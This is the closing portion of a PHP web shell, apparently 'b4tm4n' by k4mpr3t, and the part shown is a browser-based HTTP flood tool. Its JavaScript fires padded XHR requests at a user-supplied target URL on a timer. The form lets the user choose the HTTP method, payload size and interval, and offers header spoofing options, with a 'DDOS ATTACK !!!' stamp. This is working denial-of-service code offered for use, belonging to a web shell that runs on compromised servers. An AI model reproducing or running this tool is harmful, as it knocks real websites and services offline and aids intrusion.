
							for(var j=0;j<size.value;j++){
							data.append(what, stamp.value);}
							xhrx.send(data);
					        };
						var onRequest=function(){
					            requests++;
					            requestsNode.innerHTML=requests;
						    };
						var onProcess=function(){
						    	proccess++;
					            proccessNode.innerHTML=proccess;
						    };
						var onSuccess=function(){
					            success++;
					            successNode.innerHTML=success;
					    	};
						attack.onclick=function(){
							var today=new Date();
						    var h=today.getHours();
						    var m=today.getMinutes();
						    var s=today.getSeconds();
						    m=m<10?"0"+m:m;
						    s=s<10?"0"+s:s;
							if(this.value==\'Start\'){
								this.value="Stop";
								requests=0;
						        succeeded=0;
						        proccess=0;
						        document.getElementById("start").innerHTML="00:00:00";
						        document.getElementById("finish").innerHTML="00:00:00";
								interval=setInterval(makeHttpRequest,(parseInt(time.value)));
								document.getElementById("start").innerHTML=h+":"+m+":"+s;
							}else if(this.value==\'Stop\'){
								this.value="Start";
								xhttp.abort();
								clearInterval(interval);
								document.getElementById("finish").innerHTML=h+":"+m+":"+s;
							}
						};
						function startTime(){
						    var today=new Date();
						    var h=today.getHours();
						    var m=today.getMinutes();
						    var s=today.getSeconds();
						    m=m<10?"0"+m:m;
						    s=s<10?"0"+s:s;
						    document.getElementById("times").innerHTML=h+":"+m+":"+s;
						    var t=setTimeout(startTime,500);
						}
					}
				</script>
				<form onsubmit="return false;" class="new">
					<label>Target</label><input type="text" id="target" value="http://www.target.com"><br>
					<label>Stamp</label><input type="text" id="stamp" value="DDOS ATTACK !!!"><br>
					<label>Method</label><select id="method">
					<option value="PUT">PUT</option>
					<option value="GET">GET</option>
					<option value="POST">POST</option>
					<option value="HEAD">HEAD</option>
					<option value="TRACE">TRACE</option>
					<option value="PATCH">PATCH</option>
					<option value="OPTIONS">GET</option>
					<option value="DELETE">DELETE</option>
					<option value="CONNECT">CONNECT</option>
					<option value="OPTIONS">OPTIONS</option>
					</select><br>
					<label>Size (kB)</label><input type="number" id="size" value="1024"><br>
					<label>Time (ms)</label><input type="number" id="time" value="500"><br>
					<label>Options</label>
					<input type="checkbox" id="uagent" name="uagent" style="vertical-align:middle"> User Agent
					<input type="checkbox" id="referer" name="referer" style="vertical-align:middle"> Referer  Target
					<input type="checkbox" id="origin" name="origin" style="vertical-align:middle"> Origin<br>
					<label style="margin:5px 0px 5px">
						Time <span id="times">00:00:00</span> | 
						Start <span id="start">00:00:00</span> | 
						Finish <span id="finish">00:00:00</span>
					</label><br>
					<label style="margin:0px 0px 5px">
						Requests <span id="requests">0</span> | 
						Proccess <span id="proccess">0</span> | 
						Success <span id="success">0</span>
					</label><br>
					<input type="submit" id="attack" value="Start"/>
				</form>');
	}

	print "</div>";
}
/* END CUSTOM TOOLZ */

printf("</div><!-- content -->
		</div><!-- container -->
			<div id='footer'>
				<div id='copyrights'><a href='//github.com/k4mpr3t/b4tm4n'>k4mpr3t</a> &copy; %s</div>
				<div id='pageload'>Page Loaded in %s Seconds</div>
			</div>
		</body>
		</html>",date('Y'),round((microtime(true)-$start),2)
);

}?>
